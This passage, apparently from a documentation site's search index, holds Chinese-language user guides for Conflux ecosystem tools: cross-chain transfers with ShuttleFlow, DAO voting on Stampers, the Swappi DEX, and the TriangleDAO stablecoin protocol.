\u9875\u9762\uff0c\u5728\u516c\u94fe\u7684\u4e0b\u62c9\u680f\u4e2d\u9009\u62e9 ETH /Conflux \u8de8\u94fe\u5bf9\u3002 \u6ce8\u610f\uff1a\u4e0a\u65b9\u7684\u94fe\u4e3a\u8d44\u4ea7\u8de8\u51fa\u94fe\uff0c\u4e0b\u65b9\u7684\u94fe\u4e3a\u8d44\u4ea7\u8de8\u5165\u94fe\u3002Gas\u8d39\u4f1a\u901a\u8fc7\u8de8\u51fa\u94fe\u6267\u884c\u3002 3\uff09\u9009\u62e9\u4ee3\u5e01 \u00b6 \u5728\u4ee3\u5e01\u7684\u4e0b\u62c9\u680f\u4e2d\u9009\u62e9\u4ee3\u5e01\uff0c\u8fd9\u91cc\u9009\u62e9 ETH\u3002 \u6ce8\uff1a\u60a8\u6240\u6301\u6709\u7684\u4ee3\u5e01\u53ef\u4ee5\u5728\u6240\u6709\u652f\u6301 Conflux \u7f51\u7edc\u7684\u94b1\u5305\u4e2d\u67e5\u770b\uff0c\u6bd4\u5982 ConfluxPortal \u3002\u82e5\u672a\u627e\u5230\u8be5\u4ee3\u5e01\uff0c\u53ef\u80fd\u9700\u8981\u60a8\u901a\u8fc7\u201c\u6dfb\u52a0\u4ee3\u5e01\u201d\u7684\u65b9\u5f0f\u81ea\u884c\u6dfb\u52a0\u3002 4\uff09\u586b\u5165\u8f6c\u8d26\u6570\u989d \u00b6 \u5728\u4ee3\u5e01\u5217\u8868\u4e0b\u65b9\u7684\u6570\u989d\u4e2d\u586b\u5165\u60f3\u8de8\u5165\u7684\u4ee3\u5e01\u6570\u91cf\uff0c\u5e76\u5728\u4e0b\u65b9\u663e\u793a\u7684 Conflux\u94b1\u5305\u5730\u5740 \u4e2d\u786e\u8ba4\u4f60\u7684 \u6536\u6b3e\u94b1\u5305\u5730\u5740 \u3002 \u8f6c\u8d26\u65f6\u8bf7\u6ce8\u610f\u624b\u7eed\u8d39\u7684\u6570\u989d\u3002 5\uff09\u4f7f\u7528 MetaMask \u5b8c\u6210\u8f6c\u8d26 \u00b6 \u70b9\u51fb\u201cNext\u201d\uff0c\u5728\u5f39\u51fa\u6846\u4e2d\u786e\u8ba4\u4fe1\u606f\u65e0\u8bef\u540e\uff0c\u52fe\u9009 \u201cI read and accept\u201d\uff0c\u70b9\u51fb\u201cSend\u201d\u3002 \u8bf7\u52a1\u5fc5\u77e5\u6653\uff1a \u8bf7\u52a1\u5fc5\u786e\u8ba4\u5730\u5740\u51c6\u786e\u65e0\u8bef \u8de8\u94fe\u624b\u7eed\u8d39\u5c06\u4f1a\u5728\u8de8\u94fe\u4ea4\u6613\u6570\u91cf\u4e2d\u6263\u51cf \u4f60\u9700\u8981\u652f\u4ed8 Ethereum \u7f51\u7edc\u7684 Gas \u8d39 \u5728 MetaMask \u5f39\u51fa\u6846\u4e2d\u786e\u8ba4\u4ea4\u6613\u5373\u53ef\u3002\u7b49\u5f85\u6240\u6709\u94fe\u4e0a\u4ea4\u6613\u786e\u8ba4\u540e\uff0c\u5c31\u8de8\u5165\u6210\u529f\u4e86\uff0c\u5728 Conflux \u8d26\u6237\u4e2d\u4f1a\u6536\u5230 cETH\u3002 \u6210\u529f\u63d0\u4ea4\u4ea4\u6613\u540e\uff0c\u53ef\u4ee5\u70b9\u51fb\u201cView on Scan\u201d\u8df3\u8f6c\u5230 ConfluxScan \u533a\u5757\u6d4f\u89c8\u5668\u4e0a\u67e5\u770b\u4ea4\u6613\u4fe1\u606f \u4e5f\u53ef\u4ee5\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684\u7ea2\u70b9\u67e5\u770b\u4ea4\u6613\u8bb0\u5f55\u3002 \u6ce8\uff1a 1.\u8bf7\u786e\u8ba4\u53ef\u4ee5\u63a5\u6536\u5bf9\u5e94\u4ee3\u5e01\u8d44\u4ea7\u7684\u94b1\u5305\u5730\u5740\uff0c\u5426\u5219\u8d44\u4ea7\u5c06\u4e0d\u53ef\u627e\u56de\u3002 2.\u8de8\u94fe\u9700\u8981\u4e00\u5b9a\u6570\u91cf\u7684\u533a\u5757\u786e\u8ba4\u624d\u80fd\u5230\u8d26\uff0c\u53ef\u4ee5\u5728\u5386\u53f2\u8bb0\u5f55\u6216\u533a\u5757\u94fe\u6d4f\u89c8\u5668\u67e5\u770b\u8fdb\u5ea6 3.ShuttleFlow \u662f\u771f\u6b63\u7684\u53bb\u4e2d\u5fc3\u5316\u4ea7\u54c1\uff0c\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u63a5\u89e6\u4e0d\u5230\u7528\u6237\u7684\u79c1\u94a5\u3002 4.\u60a8\u7684\u8d44\u4ea7\u6258\u7ba1\u5728\u667a\u80fd\u5408\u7ea6 ShuttleFlow \u4e2d\uff0c\u5408\u7ea6\u901a\u8fc7\u7b2c\u4e09\u65b9\u5b89\u5168\u5ba1\u8ba1\uff0c\u5e76\u7531 ShuttleFlow \u8de8\u94fe\u8d44\u4ea7\u8054\u76df\u591a\u91cd\u7b7e\u540d\u9632\u62a4\u3002\u5373\u4f7f ShuttleFlow \u81ea\u8eab\u79c1\u94a5\u6cc4\u9732\uff0c\u9ed1\u5ba2\u4e5f\u65e0\u6cd5\u76d7\u53d6\u7528\u6237\u8d44\u4ea7\uff0c\u5e73\u53f0\u81ea\u8eab\u4e5f\u65e0\u6cd5\u4f5c\u6076\u3002 6\uff09\u67e5\u770b\u81ea\u5df1 ConfluxPortal \u94b1\u5305\u4e2d\u662f\u5426\u6536\u5230 cETH \u00b6 \u70b9\u51fb\u53f3\u4e0a\u89d2\u83dc\u5355\u680f \u9009\u62e9\u201cAdd Token\u201d \u8f93\u5165\u201ccETH\u201d\u5e76\u9009\u62e9\u201cNEXT\u201d-\u201cAdd Tokens\u201d\uff0c\u4fbf\u53ef\u5728 ConfluxPortal \u4e2d\u770b\u5230 cETH\u3002","title":"Shuttleflow\u8de8\u94fe\u5de5\u5177"},{"location":"ecosystem/shuttleflow/#shuttleflow","text":"ShuttleFlow \u901a\u8fc7 Conflux \u94fe\u4f5c\u4e3a\u4e2d\u7ee7\u6865\u6881\uff0c\u53ef\u4ee5\u5feb\u901f\u5b8c\u6210\u591a\u94fe\u4e4b\u95f4\u7684\u7075\u6d3b\u8de8\u94fe\u3002 ShuttleFlow \u5730\u5740\uff1a shuttleflow.io ShuttleFlow\u767d\u76ae\u4e66\uff1a white paper \u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e00\u4e0b\u5982\u4f55\u4f7f\u7528 ShuttleFlow \u8fdb\u884c\u8de8\u94fe\uff0c\u4ee5 ETH \u8de8\u5165\u81f3 Conflux \u4e3a\u4f8b","title":"Shuttleflow\u8de8\u94fe\u5de5\u5177"},{"location":"ecosystem/shuttleflow/#shuttleflowv13eth","text":"","title":"ShuttleflowV1.3\u8de8\u94fe\u6559\u7a0b\uff08\u4ee5ETH\u4e3a\u4f8b\uff09"},{"location":"ecosystem/shuttleflow/#1","text":"\u70b9\u51fb\u4e0a\u65b9\u201cConnect Wallet\u201d\uff0c\u8fde\u63a5 ConfluxPortal \u94b1\u5305\u548c MetaMask \u94b1\u5305\u3002","title":"1\uff09\u8fde\u63a5\u94b1\u5305"},{"location":"ecosystem/shuttleflow/#2","text":"\u8fdb\u5165 ShuttleFlow \u9875\u9762\uff0c\u5728\u516c\u94fe\u7684\u4e0b\u62c9\u680f\u4e2d\u9009\u62e9 ETH /Conflux \u8de8\u94fe\u5bf9\u3002 \u6ce8\u610f\uff1a\u4e0a\u65b9\u7684\u94fe\u4e3a\u8d44\u4ea7\u8de8\u51fa\u94fe\uff0c\u4e0b\u65b9\u7684\u94fe\u4e3a\u8d44\u4ea7\u8de8\u5165\u94fe\u3002Gas\u8d39\u4f1a\u901a\u8fc7\u8de8\u51fa\u94fe\u6267\u884c\u3002","title":"2\uff09\u9009\u62e9\u8de8\u94fe\u5bf9"},{"location":"ecosystem/shuttleflow/#3","text":"\u5728\u4ee3\u5e01\u7684\u4e0b\u62c9\u680f\u4e2d\u9009\u62e9\u4ee3\u5e01\uff0c\u8fd9\u91cc\u9009\u62e9 ETH\u3002 \u6ce8\uff1a\u60a8\u6240\u6301\u6709\u7684\u4ee3\u5e01\u53ef\u4ee5\u5728\u6240\u6709\u652f\u6301 Conflux \u7f51\u7edc\u7684\u94b1\u5305\u4e2d\u67e5\u770b\uff0c\u6bd4\u5982 ConfluxPortal \u3002\u82e5\u672a\u627e\u5230\u8be5\u4ee3\u5e01\uff0c\u53ef\u80fd\u9700\u8981\u60a8\u901a\u8fc7\u201c\u6dfb\u52a0\u4ee3\u5e01\u201d\u7684\u65b9\u5f0f\u81ea\u884c\u6dfb\u52a0\u3002","title":"3\uff09\u9009\u62e9\u4ee3\u5e01"},{"location":"ecosystem/shuttleflow/#4","text":"\u5728\u4ee3\u5e01\u5217\u8868\u4e0b\u65b9\u7684\u6570\u989d\u4e2d\u586b\u5165\u60f3\u8de8\u5165\u7684\u4ee3\u5e01\u6570\u91cf\uff0c\u5e76\u5728\u4e0b\u65b9\u663e\u793a\u7684 Conflux\u94b1\u5305\u5730\u5740 \u4e2d\u786e\u8ba4\u4f60\u7684 \u6536\u6b3e\u94b1\u5305\u5730\u5740 \u3002 \u8f6c\u8d26\u65f6\u8bf7\u6ce8\u610f\u624b\u7eed\u8d39\u7684\u6570\u989d\u3002","title":"4\uff09\u586b\u5165\u8f6c\u8d26\u6570\u989d"},{"location":"ecosystem/shuttleflow/#5-metamask","text":"\u70b9\u51fb\u201cNext\u201d\uff0c\u5728\u5f39\u51fa\u6846\u4e2d\u786e\u8ba4\u4fe1\u606f\u65e0\u8bef\u540e\uff0c\u52fe\u9009 \u201cI read and accept\u201d\uff0c\u70b9\u51fb\u201cSend\u201d\u3002 \u8bf7\u52a1\u5fc5\u77e5\u6653\uff1a \u8bf7\u52a1\u5fc5\u786e\u8ba4\u5730\u5740\u51c6\u786e\u65e0\u8bef \u8de8\u94fe\u624b\u7eed\u8d39\u5c06\u4f1a\u5728\u8de8\u94fe\u4ea4\u6613\u6570\u91cf\u4e2d\u6263\u51cf \u4f60\u9700\u8981\u652f\u4ed8 Ethereum \u7f51\u7edc\u7684 Gas \u8d39 \u5728 MetaMask \u5f39\u51fa\u6846\u4e2d\u786e\u8ba4\u4ea4\u6613\u5373\u53ef\u3002\u7b49\u5f85\u6240\u6709\u94fe\u4e0a\u4ea4\u6613\u786e\u8ba4\u540e\uff0c\u5c31\u8de8\u5165\u6210\u529f\u4e86\uff0c\u5728 Conflux \u8d26\u6237\u4e2d\u4f1a\u6536\u5230 cETH\u3002 \u6210\u529f\u63d0\u4ea4\u4ea4\u6613\u540e\uff0c\u53ef\u4ee5\u70b9\u51fb\u201cView on Scan\u201d\u8df3\u8f6c\u5230 ConfluxScan \u533a\u5757\u6d4f\u89c8\u5668\u4e0a\u67e5\u770b\u4ea4\u6613\u4fe1\u606f \u4e5f\u53ef\u4ee5\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684\u7ea2\u70b9\u67e5\u770b\u4ea4\u6613\u8bb0\u5f55\u3002 \u6ce8\uff1a 1.\u8bf7\u786e\u8ba4\u53ef\u4ee5\u63a5\u6536\u5bf9\u5e94\u4ee3\u5e01\u8d44\u4ea7\u7684\u94b1\u5305\u5730\u5740\uff0c\u5426\u5219\u8d44\u4ea7\u5c06\u4e0d\u53ef\u627e\u56de\u3002 2.\u8de8\u94fe\u9700\u8981\u4e00\u5b9a\u6570\u91cf\u7684\u533a\u5757\u786e\u8ba4\u624d\u80fd\u5230\u8d26\uff0c\u53ef\u4ee5\u5728\u5386\u53f2\u8bb0\u5f55\u6216\u533a\u5757\u94fe\u6d4f\u89c8\u5668\u67e5\u770b\u8fdb\u5ea6 3.ShuttleFlow \u662f\u771f\u6b63\u7684\u53bb\u4e2d\u5fc3\u5316\u4ea7\u54c1\uff0c\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u63a5\u89e6\u4e0d\u5230\u7528\u6237\u7684\u79c1\u94a5\u3002 4.\u60a8\u7684\u8d44\u4ea7\u6258\u7ba1\u5728\u667a\u80fd\u5408\u7ea6 ShuttleFlow \u4e2d\uff0c\u5408\u7ea6\u901a\u8fc7\u7b2c\u4e09\u65b9\u5b89\u5168\u5ba1\u8ba1\uff0c\u5e76\u7531 ShuttleFlow \u8de8\u94fe\u8d44\u4ea7\u8054\u76df\u591a\u91cd\u7b7e\u540d\u9632\u62a4\u3002\u5373\u4f7f ShuttleFlow \u81ea\u8eab\u79c1\u94a5\u6cc4\u9732\uff0c\u9ed1\u5ba2\u4e5f\u65e0\u6cd5\u76d7\u53d6\u7528\u6237\u8d44\u4ea7\uff0c\u5e73\u53f0\u81ea\u8eab\u4e5f\u65e0\u6cd5\u4f5c\u6076\u3002","title":"5\uff09\u4f7f\u7528 MetaMask \u5b8c\u6210\u8f6c\u8d26"},{"location":"ecosystem/shuttleflow/#6-confluxportal-ceth","text":"\u70b9\u51fb\u53f3\u4e0a\u89d2\u83dc\u5355\u680f \u9009\u62e9\u201cAdd Token\u201d \u8f93\u5165\u201ccETH\u201d\u5e76\u9009\u62e9\u201cNEXT\u201d-\u201cAdd Tokens\u201d\uff0c\u4fbf\u53ef\u5728 ConfluxPortal \u4e2d\u770b\u5230 cETH\u3002","title":"6\uff09\u67e5\u770b\u81ea\u5df1 ConfluxPortal \u94b1\u5305\u4e2d\u662f\u5426\u6536\u5230 cETH"},{"location":"ecosystem/stampers/","text":"Stampers \u00b6 \u751f\u6001\u4ecb\u7ecd \u00b6 Stampers\u662f\u4e00\u6b3e\u65e0\u9700\u82b1\u8d39\u71c3\u6599\u5373\u53ef\u53c2\u4e0e\u591a\u65b9DAO\u6cbb\u7406\u7684\u6295\u7968\u7cfb\u7edf\uff0c\u5176\u5177\u6709\u7ed3\u679c\u6613\u4e8e\u9a8c\u8bc1\u4e14\u96be\u4ee5\u88ab\u6076\u610f\u7ade\u4e89\u7684\u7279\u70b9\u3002Stampers\u662f\u4ee5snapshot\u7cfb\u7edf\u4e3a\u57fa\u7840\u7ecf\u91cd\u6784\u9002\u914d\u4f7f\u5176\u80fd\u591f\u5728Conflux\u7f51\u7edc\u4e2d\u4f7f\u7528\u5e76\u5f00\u5c55DAO\u6cbb\u7406\u6d3b\u52a8\u3002 \u76f8\u5173\u94fe\u63a5 \u00b6 \u5f00\u6e90\u4ed3\u5e93 \uff1a \u9700\u8981\u7533\u8bf7\u5728stampers\u5f00\u8f9f\u6cbb\u7406\u7a7a\u95f4\u7684\u5f00\u53d1\u8005\u9700\u8981\u91cd\u70b9\u5173\u6ce8\u8be5\u94fe\u63a5 Stampers\u6cbb\u7406\u7cfb\u7edf \uff1a \u8bbf\u95ee\u8be5\u94fe\u63a5\u53c2\u4e0e\u6295\u7968\u6cbb\u7406 \u754c\u9762\u4fe1\u606f \u00b6 \u901a\u8fc7\u8bbf\u95ee Stampers\u6cbb\u7406\u7cfb\u7edf \uff0c\u53ef\u53d1\u73b0\u76ee\u524d\u5171\u67098\u4e2a\u9879\u76ee\u5728Stampers\u5f00\u8f9f\u4e86\u6cbb\u7406\u7a7a\u95f4 \u4f7f\u7528\u6559\u7a0b \u00b6 \u4ee5\u7b14\u8005\u53c2\u4e0eCRYPTO TECH NIGHT\u6cbb\u7406\u4e3a\u4f8b\uff0c\u5728stampers\u4e2d\u627e\u5230CTN\u7684\u6cbb\u7406\u7a7a\u95f4 \u70b9\u51fb\u8fdb\u5165\u6cbb\u7406\u7a7a\u95f4\uff0c\u53ef\u4ee5\u770b\u5230\u76ee\u524d\u4e00\u5171\u67092\u4e2a\u63d0\u6848\uff0c\u5176\u4e2dactive\u72b6\u6001\u7684\u63d0\u6848\u53ef\u53c2\u4e0e \u70b9\u51fb\u8fdb\u5165 CTN#10 topic \u6cbb\u7406\uff0c\u9009\u53d6\u611f\u5174\u8da3\u7684\u9009\u9879\u5e76\u70b9\u51fbVote \u786e\u8ba4\u6295\u7968 \u5728\u547c\u51fa\u7684Portal\u4e2d\u70b9\u51fbSign\u6309\u94ae\u7b7e\u540d\u4ea4\u6613\u4f7f\u6295\u7968\u786e\u8ba4 \u9759\u5f85\u4ea4\u6613\u786e\u8ba4\u5373\u6295\u7968\u6210\u529f","title":"Stampers"},{"location":"ecosystem/stampers/#stampers","text":"","title":"Stampers"},{"location":"ecosystem/stampers/#_1","text":"Stampers\u662f\u4e00\u6b3e\u65e0\u9700\u82b1\u8d39\u71c3\u6599\u5373\u53ef\u53c2\u4e0e\u591a\u65b9DAO\u6cbb\u7406\u7684\u6295\u7968\u7cfb\u7edf\uff0c\u5176\u5177\u6709\u7ed3\u679c\u6613\u4e8e\u9a8c\u8bc1\u4e14\u96be\u4ee5\u88ab\u6076\u610f\u7ade\u4e89\u7684\u7279\u70b9\u3002Stampers\u662f\u4ee5snapshot\u7cfb\u7edf\u4e3a\u57fa\u7840\u7ecf\u91cd\u6784\u9002\u914d\u4f7f\u5176\u80fd\u591f\u5728Conflux\u7f51\u7edc\u4e2d\u4f7f\u7528\u5e76\u5f00\u5c55DAO\u6cbb\u7406\u6d3b\u52a8\u3002","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/stampers/#_2","text":"\u5f00\u6e90\u4ed3\u5e93 \uff1a \u9700\u8981\u7533\u8bf7\u5728stampers\u5f00\u8f9f\u6cbb\u7406\u7a7a\u95f4\u7684\u5f00\u53d1\u8005\u9700\u8981\u91cd\u70b9\u5173\u6ce8\u8be5\u94fe\u63a5 Stampers\u6cbb\u7406\u7cfb\u7edf \uff1a \u8bbf\u95ee\u8be5\u94fe\u63a5\u53c2\u4e0e\u6295\u7968\u6cbb\u7406","title":"\u76f8\u5173\u94fe\u63a5"},{"location":"ecosystem/stampers/#_3","text":"\u901a\u8fc7\u8bbf\u95ee Stampers\u6cbb\u7406\u7cfb\u7edf \uff0c\u53ef\u53d1\u73b0\u76ee\u524d\u5171\u67098\u4e2a\u9879\u76ee\u5728Stampers\u5f00\u8f9f\u4e86\u6cbb\u7406\u7a7a\u95f4","title":"\u754c\u9762\u4fe1\u606f"},{"location":"ecosystem/stampers/#_4","text":"\u4ee5\u7b14\u8005\u53c2\u4e0eCRYPTO TECH NIGHT\u6cbb\u7406\u4e3a\u4f8b\uff0c\u5728stampers\u4e2d\u627e\u5230CTN\u7684\u6cbb\u7406\u7a7a\u95f4 \u70b9\u51fb\u8fdb\u5165\u6cbb\u7406\u7a7a\u95f4\uff0c\u53ef\u4ee5\u770b\u5230\u76ee\u524d\u4e00\u5171\u67092\u4e2a\u63d0\u6848\uff0c\u5176\u4e2dactive\u72b6\u6001\u7684\u63d0\u6848\u53ef\u53c2\u4e0e \u70b9\u51fb\u8fdb\u5165 CTN#10 topic \u6cbb\u7406\uff0c\u9009\u53d6\u611f\u5174\u8da3\u7684\u9009\u9879\u5e76\u70b9\u51fbVote \u786e\u8ba4\u6295\u7968 \u5728\u547c\u51fa\u7684Portal\u4e2d\u70b9\u51fbSign\u6309\u94ae\u7b7e\u540d\u4ea4\u6613\u4f7f\u6295\u7968\u786e\u8ba4 \u9759\u5f85\u4ea4\u6613\u786e\u8ba4\u5373\u6295\u7968\u6210\u529f","title":"\u4f7f\u7528\u6559\u7a0b"},{"location":"ecosystem/swappi/","text":"Swappi \u00b6 Conflux espace \u4e0a\u7684\u9996\u4e2a DEX \u751f\u6001\uff0c\u53c2\u4e0e Swappi \u9700\u8981\u5728 Metamask \u4e2d\u914d\u7f6e Conflux espace \u7f51\u7edc RPC\uff0c \u5728 Metamask \u94b1\u5305\u914d\u7f6e espace \u65b9\u6cd5 \u3002 \u751f\u6001\u94fe\u63a5 \u00b6 Swappi \u751f\u6001\u622a\u56fe \u00b6 \u4f7f\u7528\u6559\u7a0b \u00b6 Swappi DEX \u4f7f\u7528\u8bf4\u660e\u53ca\u6559\u7a0b \u6570\u636e\u5206\u6790\u6a21\u5757\u4f7f\u7528\u6559\u7a0b \u00b6 \u5728\u751f\u6001\u622a\u56fe\u4e2d\u6211\u4eec\u80fd\u591f\u770b\u5230Swappi\u63d0\u4f9b\u4e86 Analytics \u6a21\u5757 \uff0c\u53ef\u4ee5\u5e2e\u52a9\u7528\u6237\u5bf9\u76ee\u524d DEX \u4e2d\u7684\u4ee3\u5e01\u53ca token pair \u53ca\u5730\u5740\u4fe1\u606f\u8fdb\u884c\u5206\u6790\u3002 Overview\uff1a\u63d0\u4f9b Swappi \u5e73\u53f0\u6d41\u52a8\u6027\uff0c\u4ea4\u6613\u91cf\uff0c\u4ea4\u6613\u5bf9\u6570\u76ee\u7b49\u6570\u636e\u7edf\u8ba1\u4fe1\u606f Tokens\uff1a\u4ee3\u5e01\u7edf\u8ba1\u4fe1\u606f\uff0c\u4ef7\u683c\uff0c\u6d41\u52a8\u6027\uff0c\u4ea4\u6613\u91cf\u7b49\u7edf\u8ba1\u4fe1\u606f Pairs\uff1a\u663e\u793a\u5e73\u53f0\u76ee\u524d\u7684\u6240\u6709\u4ea4\u6613\u5bf9 Accounts\uff1a\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5728\u641c\u7d22\u6846\u952e\u5165\u76ee\u6807\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u9488\u5bf9\u5f53\u4e2a\u8d26\u6237\u4ea4\u6613\u6570\u636e\u8fdb\u884c\u5206\u6790","title":"Swappi"},{"location":"ecosystem/swappi/#swappi","text":"Conflux espace \u4e0a\u7684\u9996\u4e2a DEX \u751f\u6001\uff0c\u53c2\u4e0e Swappi \u9700\u8981\u5728 Metamask \u4e2d\u914d\u7f6e Conflux espace \u7f51\u7edc RPC\uff0c \u5728 Metamask \u94b1\u5305\u914d\u7f6e espace \u65b9\u6cd5 \u3002","title":"Swappi"},{"location":"ecosystem/swappi/#_1","text":"Swappi","title":"\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/swappi/#_2","text":"","title":"\u751f\u6001\u622a\u56fe"},{"location":"ecosystem/swappi/#_3","text":"Swappi DEX \u4f7f\u7528\u8bf4\u660e\u53ca\u6559\u7a0b","title":"\u4f7f\u7528\u6559\u7a0b"},{"location":"ecosystem/swappi/#_4","text":"\u5728\u751f\u6001\u622a\u56fe\u4e2d\u6211\u4eec\u80fd\u591f\u770b\u5230Swappi\u63d0\u4f9b\u4e86 Analytics \u6a21\u5757 \uff0c\u53ef\u4ee5\u5e2e\u52a9\u7528\u6237\u5bf9\u76ee\u524d DEX \u4e2d\u7684\u4ee3\u5e01\u53ca token pair \u53ca\u5730\u5740\u4fe1\u606f\u8fdb\u884c\u5206\u6790\u3002 Overview\uff1a\u63d0\u4f9b Swappi \u5e73\u53f0\u6d41\u52a8\u6027\uff0c\u4ea4\u6613\u91cf\uff0c\u4ea4\u6613\u5bf9\u6570\u76ee\u7b49\u6570\u636e\u7edf\u8ba1\u4fe1\u606f Tokens\uff1a\u4ee3\u5e01\u7edf\u8ba1\u4fe1\u606f\uff0c\u4ef7\u683c\uff0c\u6d41\u52a8\u6027\uff0c\u4ea4\u6613\u91cf\u7b49\u7edf\u8ba1\u4fe1\u606f Pairs\uff1a\u663e\u793a\u5e73\u53f0\u76ee\u524d\u7684\u6240\u6709\u4ea4\u6613\u5bf9 Accounts\uff1a\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5728\u641c\u7d22\u6846\u952e\u5165\u76ee\u6807\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u9488\u5bf9\u5f53\u4e2a\u8d26\u6237\u4ea4\u6613\u6570\u636e\u8fdb\u884c\u5206\u6790","title":"\u6570\u636e\u5206\u6790\u6a21\u5757\u4f7f\u7528\u6559\u7a0b"},{"location":"ecosystem/triangledao/","text":"Triangle DAO \u00b6 \u751f\u6001\u4ecb\u7ecd \u00b6 TriAngleDao(\u793e\u533a\u4e60\u60ef\u79f0\u4e4b\u4e3a\u4e09\u89d2\u9053\uff0c\u7b80\u79f0TAD)\uff0c\u4e09\u89d2\u9053\u662f\u4e00\u4e2a\u57fa\u4e8eCFX\u7684\u7a33\u5b9a\u5e01\u9879\u76ee\u3002\u5176\u4e3b\u8981\u601d\u60f3\u662f\uff0c\u901a\u8fc7\u8d85\u989d\u62b5\u62bcCFX\uff0c\u4ece\u4e09\u89d2\u9053\u5904\u501f\u51fa\u7a33\u5b9a\u5e01AUSD\uff0c\u4e00\u79cd\u4e0e\u7f8e\u51431\uff1a1\u951a\u5b9a\u7684\u94fe\u4e0a\u4ee3\u5e01\u3002\u4e14CFX\u62b5\u62bc\u7387\u4e0d\u5f97\u4f4e\u4e8e110%\u3002\u5373\u6bcf\u4e00\u679aaUSD\u80cc\u540e\u6709\u4e0d\u4f4e\u4e8e\u4ef7\u503c1.1U\u7684CFX\u62b5\u62bc\u3002TriAngle DAO \u662f\u4e00\u6b3e\u5168\u7403\u901a\u7528\u7684\u7a33\u5b9a\u5e01\u534f\u8bae\uff0c\u80fd\u591f\u5728\u4efb\u610f\u4f4d\u7f6e\u7684\u4efb\u610f\u7528\u6237\u5728\u4efb\u610f\u65f6\u523b\u63d0\u4f9b\u5b8c\u5168\u65e0\u606f\u7684\u7a33\u5b9a\u5e01\uff0c\u65e8\u5728\u4e3a\u90a3\u4e9b\u65e0\u6cd5\u4f7f\u7528\u94f6\u884c\u670d\u52a1\u7684\u7528\u6237\u63d0\u4f9b\u7c7b\u4f3c\u94f6\u884c\u7684\u670d\u52a1\u3002\u4ee5Conflux\u7f51\u7edc\u4e3a\u4f8b\uff0cTriAngle DAO\u662f\u4e00\u6b3e\u80fd\u591f\u901a\u8fc7\u62b5\u62bcCFX\u751f\u6210\u7a33\u5b9a\u5e01AUSD\u63d0\u4f9b\u65e0\u606f\u6d41\u52a8\u8d44\u91d1\u7684\u534f\u8bae\u3002\u901a\u8fc7\u8fd0\u7528\u5148\u8fdb\u7684\u6e05\u7b97\u673a\u5236\u548c\u57fa\u4e8e\u7b97\u6cd5\u7684\u8d27\u5e01\u653f\u7b56\uff0c\u80fd\u591f\u4e3a\u501f\u6b3e\u4eba\u63d0\u4f9b\u4e00\u5b9a\u7684\u4f18\u52bf\u548c\u597d\u5904\u3002 \u751f\u6001\u94fe\u63a5 \u00b6 TriAngleDao\u4e3b\u9875 \u9879\u76ee\u7ec6\u8282 \u00b6 \u751f\u6001\u529f\u80fd\u4ecb\u7ecd \u00b6 TriAngleDao\u7684\u529f\u80fd\u4e3b\u8981\u5305\u62ec\uff1a Dashboard\uff1a\u4eea\u8868\u677f\uff0c\u67e5\u770b\u4e09\u89d2\u9053\u7684\u534f\u8baeTVL\u4fe1\u606f\uff0c\u9501\u4ed3CFX\u91cf\uff0c\u62b5\u62bc\u7387\uff08Total Collateral Ratio\uff09\uff0c\u6062\u590d\u6a21\u5f0f\u7684\u4ef7\u683c\u9608\u503c\uff08Recovery Mode Price Threshold\uff09\u7b49\uff0c\u5982\u679c\u8fde\u63a5Portal\u94b1\u5305\u8fd8\u4f1a\u663e\u793a\u7528\u6237\u81ea\u5df1\u501f\u51faAUSD\u7684\u603b\u91cf\u4fe1\u606f\uff0c\u62b5\u62bc\u7387\u7b49\u91cd\u8981\u4fe1\u606f\u3002 Portal\u5b89\u88c5\u6559\u7a0b\u53ef \u53c2\u8003\u94fe\u63a5 \u3002 TriAngle Bank\uff1a\u62b5\u62bcCFX\u501f\u51faAUSD\uff0c\u5f00\u542f\u94f6\u884c\u3002 Stability Pool\uff1a\u7a33\u5b9a\u5e01\u8d28\u62bc\u6c60\uff0c\u5b58\u5165AUSD\uff0c\u6316\u53d6\u5e73\u53f0\u5e01TAD\uff0c\u5728\u51fa\u73b0\u6e05\u7b97\u65f6\uff0c\u5b58\u5165\u7684AUSD\u6309\u6bd4\u4f8b\u74dc\u5206\u6e05\u7b97CFX\uff08\u4ee5\u4f18\u60e0\u4ef7\u8d2d\u4e70\uff0c\u539f\u56e0\u662f\u88ab\u6e05\u7b97\u8005\u5728\u501f\u51faAUSD\u65f6\u81f3\u5c11\u9700\u8981\u4fdd\u8bc1\u62b5\u62bc\u7684CFX\u5bf9\u5e94\u7684\u62b5\u62bc\u7387\u4e3a110%\uff09 Stake Pool\uff1a\u8d28\u62bc\u6c60\uff0c\u5b58\u5165\u5e73\u53f0\u5e01TAD\uff08\u5e26\u9501\u4ed3\u673a\u5236\uff09\uff0c\u74dc\u5206AUSD\u624b\u7eed\u8d39\uff0cCFX\u53caTAD\u7b49\u4ee3\u5e01\uff0c\u76ee\u524d\u6682\u65f6\u53ea\u53d1\u73b0AUSD\u6709\u4ea7\u51fa Mining Pool\uff1a\u6316\u77ff\u6c60\uff0c\u76ee\u524d\u8fd8\u672a\u5f00\u653e Redemption\uff1a\u5229\u7528AUSD\u8d4e\u56deCFX\uff0c\u4e09\u89d2DAO\u5c06\u4f1a\u6839\u636e\u8d26\u6237\u62b5\u62bc\u7387\u7684\u60c5\u51b5\uff0c\u7531\u62b5\u62bc\u7387\u4f4e->\u62b5\u62bc\u7387\u9ad8\u8fdb\u884c\u6392\u5e8f\uff0c\u5229\u7528AUSD\u507f\u8fd8\u5bf9\u5e94\u8d26\u6237\u7684AUSD\u503a\u52a1\uff0c\u4ee5\u6362\u53d6\u5bf9\u5e94\u8d26\u6237\u7684\u62b5\u62bc\u7269 Liquidation\uff1a\u6e05\u7b97\uff0c\u5728\u6709\u8d26\u6237\u62b5\u62bc\u7387\u8fc7\u4f4e\u65f6\uff0c\u901a\u8fc7\u70b9\u51fb\u6309\u94ae\uff0c\u63d0\u9192\u4e09\u89d2\u9053\u6709\u8d26\u6237\u9700\u8981\u6e05\u7b97\u4e86\uff0c\u8fd9\u65f6\u4e09\u89d2dao\u4f1a\u5229\u7528\u62b5\u62bc\u5728Stability 